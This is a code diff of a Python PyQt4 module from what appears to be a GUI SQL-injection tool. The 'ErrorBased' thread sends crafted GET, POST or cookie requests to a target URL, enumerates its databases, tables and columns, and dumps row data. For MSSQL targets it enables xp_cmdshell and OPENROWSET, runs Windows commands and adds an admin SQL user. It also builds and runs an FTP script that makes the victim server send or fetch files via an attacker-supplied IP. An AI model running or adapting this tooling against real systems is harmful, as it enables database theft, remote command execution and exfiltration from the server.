@@ -15,17 +15,22 @@
 
 import sys
 import time
-import web
 import txtproc
+import e_const
+import socket
 from PyQt4 import QtCore
 from threading import *
 from queue import Queue
-#from querystrings import error_based
-
+from urllib import request
+from urllib.error import HTTPError
+from urllib.error import URLError
+from urllib.parse import urlencode
 
 class ErrorBased(QtCore.QThread):
     
     #---------------Signals---------------#
+    debugSignal = QtCore.pyqtSignal(str)
+    reqLogSignal = QtCore.pyqtSignal(str)
     dbSignal = QtCore.pyqtSignal(str)
     tblCountSignal = QtCore.pyqtSignal(str)
     tblSignal = QtCore.pyqtSignal(str)
@@ -36,6 +41,7 @@ class ErrorBased(QtCore.QThread):
     querySignal = QtCore.pyqtSignal(str)
     rowDataSignal = QtCore.pyqtSignal(int, int, str)
     positionSignal = QtCore.pyqtSignal(str)
+    taskDone = QtCore.pyqtSignal(str)
     #-------------------------------------#
     
     def __init__(self, args, qstrs):
@@ -57,7 +63,154 @@ class ErrorBased(QtCore.QThread):
         elif self.vars['task'] == "addSqlUser": self.addSqlUser()
         elif self.vars['task'] == "dump": self.syncThreads()
         return
+
+#Server response debugging
+    def debug(self, strValue, notFunction):
+        if notFunction:
+            self.debugSignal.emit(strValue)
+            return
+        self.debugSignal.emit("\n - [x] 'no_content' returned by function " + strValue)
         
+    #Injection in cookies?:
+    def isCookieInjection(self, cookie):
+        if ("[sub]" or "[cmd]") in cookie:
+            return True
+
+    def buildUrl(self, strVar, query, isCmd, isCookie):
+        if isCookie:
+            query = request.quote(query)
+            strVar = strVar.replace("=[sub]", "%3d[sub]")
+            strVar = strVar.replace("=[cmd]", "%3d[cmd]")
+        if isCmd:
+            if "[cmd]" in strVar:
+                strVar = strVar.replace("[cmd]", query)
+                if "[sub]" in strVar:
+                    strVar = strVar.replace("[sub]", "1")
+            else:
+                self.debug("\n [sub] or [cmd] variables not found", True)
+                return
+        else:
+            if "[cmd]" in strVar:
+                strVar = strVar.replace(";[cmd]", "")
+            strVar = strVar.replace("[sub]", query)
+        return strVar
+
+    #Content parser
+    def contentParse(self, content, match_pattern, match_sybol):
+        patternStr = content.find(match_pattern)
+        fromStr = content.find(match_sybol, patternStr, len(content))
+        fromStr += 1
+        toStr = content.find(match_sybol, fromStr, len(content))
+        if (fromStr or toStr) <= 0:
+            file = open("err_response.html", "w")
+            file.write(content)
+            file.close()
+            self.debug("\n==================[SERVER RESPONSE]==================\n\n"\
+                    + content +\
+                    "\n\n>>>Saved to file: err_response.html", True)
+            return "no_content"
+        return content[fromStr:toStr]
+    
+#Preparing POST data
+    def preparePostData(self, data, query, isCmd):
+        data = data.replace("=[sub]",  "[shgrp_sub]")   #saving sensetive data  
+        data = ''.join([x.replace("=",  ":") for x in data])
+        data = data.replace("[shgrp_sub]",  "=[sub]")   #restore sensetive data
+        if isCmd:
+            if "[cmd]" in data:
+                data = data.replace("[cmd]", query)
+                if "[sub]" in data:
+                    data = data.replace("[sub]", "1")
+                else:
+                    return           
+        else:
+            if "[cmd]" in data:
+                data = data.replace(";[cmd]", "")
+            data = data.replace("[sub]", query)
+        data = data.split("&")
+        data= dict([s.split(':') for s in data])
+        urlEncoded = urlencode(data)
+        postData = urlEncoded.encode(e_const.ENCODING)
+        return postData
+    
+#Web request:
+    def web_request(self, query, isCmd):
+        urlOpener = request.build_opener()
+        data = request.unquote(self.vars['data'])
+        cookie = self.vars['cookie']
+        data = data.replace("+",  " ")
+        data = data.replace(":",  "")
+        if self.vars['method'] == "POST":
+            postData = self.preparePostData(data, query, isCmd)
+            if self.isCookieInjection(cookie):
+                cookie = self.buildUrl(cookie, query, isCmd, True)
+            reqLog = "\n[POST] " + self.vars['url'] + "\n" + postData.decode(e_const.ENCODING)
+            if len(cookie) > 0:
+                reqLog += "\nCookie:" + cookie
+                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT), ('Cookie', cookie)]
+            else:
+                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT)]
+            try:
+                self.reqLogSignal.emit(reqLog)
+                response = urlOpener.open(self.vars['url'], postData, self.vars['timeOut'])
+                content = response.read()
+            except HTTPError as httpErr: 
+                content = httpErr.read()
+            #Handling timeout. 
+            except socket.error:
+                errno, errstr = sys.exc_info()[:2]
+                if errno == socket.timeout:
+                    self.debug("\n\n[Timed out]", True)
+                    return "[---Timed out---]"
+            except URLError as uerr:
+                if isinstance(uerr.reason, socket.timeout):
+                    self.debug("\n\n[Timed out]", True)
+                    return "[---Timed out---]"
+        else:
+            if self.isCookieInjection(cookie):
+                cookie = self.buildUrl(cookie, query, isCmd, True)
+            else:
+                data = self.buildUrl(data, query, isCmd, False)
+            data = ''.join(data)
+            data = request.quote(data)
+            #Replacing important symbols
+            data = data.replace("%3D", "=")
+            data = data.replace("%26", "&")
+            url = self.vars['url'] + "?" + data
+            reqLog = "\n[GET] " + url
+            if len(cookie) > 0:
+                reqLog += "\nCookie: " + cookie
+                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT), ('Cookie', cookie)]
+            else:
+                urlOpener.addheaders = [('User-Agent', e_const.USER_AGENT)]
+            try:
+                self.reqLogSignal.emit(reqLog)
+                response = urlOpener.open(url, None, self.vars['timeOut'])
+                content = response.read()
+            except HTTPError as httpErr: 
+                content = httpErr.read()
+            #Handling timeout
+            except socket.error:
+                errno, errstr = sys.exc_info()[:2]
+                if errno == socket.timeout:
+                    self.debug("\n\n[Timed out]", True)
+                    return "[---Timed out---]"
+            except URLError as uerr:
+                if isinstance(uerr.reason, socket.timeout):
+                    self.debug("\n\n[Timed out]", True)
+                    return "[---Timed out---]"
+        if not isCmd:
+            if e_const.QUOTED_CONTENT:
+                content = request.unquote(content)
+            try:
+                content = content.decode(e_const.ENCODING)
+            except:
+                return "no_content"
+            db_data = self.contentParse(content, self.vars['mp'], self.vars['ms'])
+        else:
+            db_data = 0
+        return db_data
+
 #SET variables in string to valid value 
     def buildQuery(self, query, vars=None):
         ms =  txtproc.strToSqlChar(self.vars['ms'], self.vars['db_type'])
@@ -103,10 +256,10 @@ class ErrorBased(QtCore.QThread):
     def getCurrDb(self):
         if self.vars['dbListCount'] < 1:
             query = self.buildQuery(self.dbType('curr_db_name'))
-            db_name = web.webRequest(self.vars, query, False)
+            db_name = self.web_request(query, False)
             if db_name == "no_content": 
-                web.debug(sys._getframe().f_code.co_name + "() -> db_name")
-                return
+                self.debug(sys._getframe().f_code.co_name + "() -> db_name", False)
+                return 'no_db'
             self.dbSignal.emit(db_name)
         else:
             db_name = self.vars['dbName']
@@ -119,9 +272,9 @@ class ErrorBased(QtCore.QThread):
             current_db = self.vars['dbName']
             while True:
                 query = self.buildQuery(self.dbType('get_db_name'), {'cdb' : current_db})
-                db_name = web.webRequest(self.vars, query, False)
+                db_name = self.web_request(query, False)
                 if db_name == "no_content":
-                    web.debug(sys._getframe().f_code.co_name + "() -> db_name")
+                    self.debug(sys._getframe().f_code.co_name + "() -> db_name", False)
                     return
                 elif db_name == "isnull":
                     break
@@ -131,7 +284,7 @@ class ErrorBased(QtCore.QThread):
         #not in (substring) method realisation
         else:
             query = self.buildQuery(self.dbType('dbs_count'))
-            dbCount = web.webRequest(self.vars, query, False)
+            dbCount = self.web_request(query, False)
             tQueue = Queue()
             for tNum in range(int(dbCount)):  
                 tQueue.put(tNum)
@@ -148,9 +301,9 @@ class ErrorBased(QtCore.QThread):
             except Exception:  
                 break
             query = self.buildQuery(self.dbType('get_db_name2'), {'num' : str(tNum)})
-            db_name = web.webRequest(self.vars, query, False)
+            db_name = self.web_request(query, False)
             if db_name == "no_content":
-                web.debug(sys._getframe().f_code.co_name + "() -> db_name")
+                self.debug(sys._getframe().f_code.co_name + "() -> db_name", False)
                 return
             self.dbSignal.emit(db_name)
             time.sleep(0.1)
@@ -161,20 +314,21 @@ class ErrorBased(QtCore.QThread):
 #Getting tables
     def getTables(self):
         current_db = self.getCurrDb()
-        print(current_db)
+        if current_db == 'no_db':
+            return
         query = self.buildQuery(self.dbType('tbls_count'), {'cdb' : current_db})
-        tblCount = web.webRequest(self.vars, query, False)
+        tblCount = self.web_request(query, False)
         if tblCount == "no_content": 
-            web.debug(sys._getframe().f_code.co_name + "() -> tblCount")
+            self.debug(sys._getframe().f_code.co_name + "() -> tblCount", False)
             return
         self.tblCountSignal.emit(tblCount)
         if self.vars['notInArray']:
             current_table = ""
             while True:
                 query = self.buildQuery(self.dbType('get_tbl_name'), {'cdb' : current_db, 'ctbl' : current_table})
-                table_name = web.webRequest(self.vars, query, False)
+                table_name = self.web_request(query, False)
                 if table_name == "no_content":
-                    web.debug(sys._getframe().f_code.co_name + "() -> table_name")
+                    self.debug(sys._getframe().f_code.co_name + "() -> table_name", False)
                     return
                 elif table_name == "isnull":
                     break
@@ -199,9 +353,9 @@ class ErrorBased(QtCore.QThread):
             except Exception:  
                 break
             query = self.buildQuery(self.dbType('get_tbl_name2'), {'cdb' : current_db, 'num' : str(tNum)})
-            table_name = web.webRequest(self.vars, query, False)
+            table_name = self.web_request(query, False)
             if table_name == "no_content":
-                web.debug(sys._getframe().f_code.co_name + "() -> table_name")
+                self.debug(sys._getframe().f_code.co_name + "() -> table_name", False)
                 return
             self.tblSignal.emit(table_name)
             time.sleep(0.1)
@@ -212,6 +366,8 @@ class ErrorBased(QtCore.QThread):
 #Getitng columns
     def getColumns(self):
         current_db = self.getCurrDb()
+        if current_db == 'no_db':
+            return
         tables = self.vars['tables']
         #If not in(array) method selected:
         if self.vars['notInArray']: 
@@ -219,16 +375,16 @@ class ErrorBased(QtCore.QThread):
                 current_table = txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                 current_column = ""
                 query = self.buildQuery(self.dbType('columns_count'), {'cdb' : current_db, 'ctbl' : current_table})
-                columnsInTable = web.webRequest(self.vars, query, False)
+                columnsInTable = self.web_request(query, False)
                 if columnsInTable == "no_content": 
-                    web.debug(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable")
+                    self.debug(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable", False)
                     return
                 while True:
                     query = self.buildQuery(self.dbType('get_column_name'),
                                              {'cdb' : current_db, 'ctbl' : current_table, 'ccol' : current_column})
-                    column_name = web.webRequest(self.vars, query, False)
+                    column_name = self.web_request(query, False)
                     if column_name == "no_content":
-                        web.debug(sys._getframe().f_code.co_name + "() -> notInArray -> column_name")
+                        self.debug(sys._getframe().f_code.co_name + "() -> notInArray -> column_name", False)
                         return
                     elif column_name == "isnull":
                         break
@@ -241,9 +397,9 @@ class ErrorBased(QtCore.QThread):
             for i in range (self.vars['tblTreeCount']):
                 current_table = txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                 query = self.buildQuery(self.dbType('columns_count'), {'cdb' : current_db, 'ctbl' : current_table})
-                columnsInTable = web.webRequest(self.vars, query, False)
+                columnsInTable = self.web_request(query, False)
                 if columnsInTable == "no_content": 
-                    web.debug(sys._getframe().f_code.co_name + "() -> columnsinTable")
+                    self.debug(sys._getframe().f_code.co_name + "() -> columnsinTable", False)
                     return
                 for rowid in range(int(columnsInTable)):
                     #If not in(substring) method selected:
@@ -255,9 +411,9 @@ class ErrorBased(QtCore.QThread):
                         rowid += 1
                         query = self.buildQuery(self.dbType('get_column_name3'), 
                                                 {'cdb' : current_db, 'ctbl' : current_table, 'num' : str(rowid)})
-                    column_name = web.webRequest(self.vars, query, False)
+                    column_name = self.web_request(query, False)
                     if column_name == "no_content":
-                        web.debug(sys._getframe().f_code.co_name + "() -> notInSubstring -> column_name")
+                        self.debug(sys._getframe().f_code.co_name + "() -> notInSubstring -> column_name", False)
                         return
                     self.columnSignal.emit(column_name, i)
                     self.progressSignal.emit(int(columnsInTable), False)
@@ -266,30 +422,34 @@ class ErrorBased(QtCore.QThread):
 #Show rows count in selected table
     def getCountInTable(self):
         current_db = self.getCurrDb()
+        if current_db == 'no_db':
+            return
         query = self.buildQuery(self.dbType('rows_count'), {'cdb' : current_db})
-        rowsInTable = web.webRequest(self.vars, query, False)
+        rowsInTable = self.web_request(query, False)
         if rowsInTable == "no_content":
-            web.debug(sys._getframe().f_code.co_name + "() -> rowsInTable")
+            self.debug(sys._getframe().f_code.co_name + "() -> rowsInTable", False)
             return
         msg = (rowsInTable + " rows in " + self.vars['selected_table'])
         self.msgSignal.emit(msg)
-
+        return
 #Run Query     
     def runQuery(self):
         #If this select command
         if self.vars['querySelect']:
             query = self.buildQuery(self.dbType('query'))
-            result = web.webRequest(self.vars, query, False)
+            result = self.web_request(query, False)
             result = result.replace("\\r", "\r")\
             .replace("\\t", "\t").replace("\\n", "\n").replace("'/",  "'")
         else:
             result = "NULL"
-            web.webRequest(self.vars, self.vars['query_cmd'], True)
+            self.web_request(self.vars['query_cmd'], True)
         self.querySignal.emit(result)
 
  #Making synchronized threads for dumper
     def syncThreads(self):
         current_db = self.getCurrDb()
+        if current_db == 'no_db':
+            return
         columns = self.vars['columns']
         for num in range (len(columns)):
             tQueue = Queue()
@@ -312,7 +472,7 @@ class ErrorBased(QtCore.QThread):
             query = self.buildQuery(self.dbType('data_dump'), 
                                     {'cdb' : current_db, 'column' : column, 'table' : self.vars['table'], 
                                     'key' : self.vars['key'], 'num' : str(tNum)})
-            rowData = web.webRequest(self.vars, query, False)
+            rowData = self.web_request(query, False)
             if rowData == "no_content":
                 rowData = "NULL"
             self.rowDataSignal.emit(tNum, num, rowData)
@@ -324,21 +484,20 @@ class ErrorBased(QtCore.QThread):
 #============================[MSSQL FUNCTIONS ONLY]============================#
 #Enable xp_cmdshell request
     def enableXpCmdShell(self):
-        web.webRequest(self.vars, self.dbType('enable_xp_cmdshell'), True)
+        self.web_request(self.dbType('enable_xp_cmdshell'), True)
         self.msgSignal.emit("Enable xp_cmdshell request sent.")
 
 #xp_cmdshell - windows command execution    
     def xpCmdShell(self):
         #Delete tmp_table if already exist
-        web.webRequest(self.vars, self.dbType('drop_tmp_tbl'), True)
+        self.web_request(self.dbType('drop_tmp_tbl'), True)
         #Creating tmp table
-        web.webRequest(self.vars, self.dbType('create_tmp_tbl'), True)
+        self.web_request(self.dbType('create_tmp_tbl'), True)
         #Inserting xp_cmdshell output to temp table
         query = self.buildQuery(self.dbType('insert_result'), {'cmd' : txtproc.strToHex(self.vars['cmd'])})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
         #Getting count of rows in temp table
-        query = self.buildQuery(self.dbType('tmp_count'))
-        rowCount = web.webRequest(self.vars, query, False)
+        rowCount = self.web_request(self.buildQuery(self.dbType('tmp_count')), False)
         if rowCount == "no_content":
             return
         self.cmdSignal.emit(0, '0', True, int(rowCount))
@@ -358,9 +517,9 @@ class ErrorBased(QtCore.QThread):
             except Exception:  
                 break
             query = self.buildQuery(self.dbType('get_row'), {'num' : str(tNum)})
-            cmdResult = web.webRequest(self.vars, query, False)
+            cmdResult = self.web_request(query, False)
             if cmdResult == "no_content":
-                web.debug(sys._getframe().f_code.co_name + "() -> cmdResult")
+                self.debug(sys._getframe().f_code.co_name + "() -> cmdResult", False)
                 return
             self.cmdSignal.emit(tNum, txtproc.recoverSymbols(cmdResult), False, 0)
             time.sleep(0.1)
@@ -374,13 +533,13 @@ class ErrorBased(QtCore.QThread):
         execCmd = self.dbType('exec_cmdshell')
         #del ..\temp\ftp.txt /Q
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
         #echo login> ..\temp\ftp.txt
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> ..\\temp\\ftp.txt")})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
         #echo password>> ..\temp\ftp.txt
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['password'] + ">> ..\\temp\\ftp.txt")})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
         for file in ftpFiles:
             #Use SEND or GET ftp command?
             if self.vars['ftp_mode'] == "get":
@@ -391,26 +550,26 @@ class ErrorBased(QtCore.QThread):
                 #echo send c:\path\file.exe>> ..\temp\ftp.txt
                 query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo send " + self.vars['ftpPath']\
                                     +  file + ">> ..\\temp\\ftp.txt")})
-            web.webRequest(self.vars, query, True)
+            self.web_request(query, True)
         #echo bye>> ..\temp\ftp.txt
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo bye>> ..\\temp\\ftp.txt")})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
         #ftp -s:..\temp\ftp.txt IP
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("ftp -s:..\\temp\\ftp.txt " + self.vars['ip'])})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
         #del ..\temp\ftp.txt /Q
         query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
     
 #Enable OPENROWSET request
     def enableOpenrowset(self):
-        web.webRequest(self.vars, self.dbType('enable_openrowset'), True)
+        self.web_request(self.dbType('enable_openrowset'), True)
         self.msgSignal.emit("Enable OPENROWSET request sent.")
         
 #Add user request        
     def addSqlUser(self):
         query =  self.buildQuery(self.dbType('add_sqluser'), 
                                  {'login' : self.vars['addUserLogin'], 'password' : self.vars['addUserPassword']})
-        web.webRequest(self.vars, query, True)
+        self.web_request(query, True)
         self.msgSignal.emit("Add admin user request sent.")
         
